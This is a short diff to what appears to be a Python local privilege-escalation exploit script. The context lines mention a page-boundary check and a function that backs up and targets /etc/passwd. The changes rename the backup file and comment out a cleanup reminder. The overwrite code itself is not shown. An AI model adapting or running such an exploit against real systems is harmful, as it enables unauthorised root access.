@@ -199,7 +199,7 @@ def within_page_bounds(file_offset, data_len):
     if (file_offset | PAGE) < (file_offset + data_len):
         print(f'[x] Cannot perform exploit across page boundary with offset {file_offset}')
         print('[x] Do you have access to another user?')
-        print(f'[x] Remember to clean up {backup_path}')
+        # print(f'[x] Remember to clean up {backup_path}')
         return False
     return True
 
@@ -294,7 +294,7 @@ def run_elf(binary_name):
 
 def run_etc_passwd():
     # Backup file
-    backup_path = '/tmp/passwd'
+    backup_path = '/tmp/passwd_88_88'
     target_file = '/etc/passwd'
     print(f'[*] Backing up {target_file} to {backup_path}')
     backup_file(target_file, backup_path)
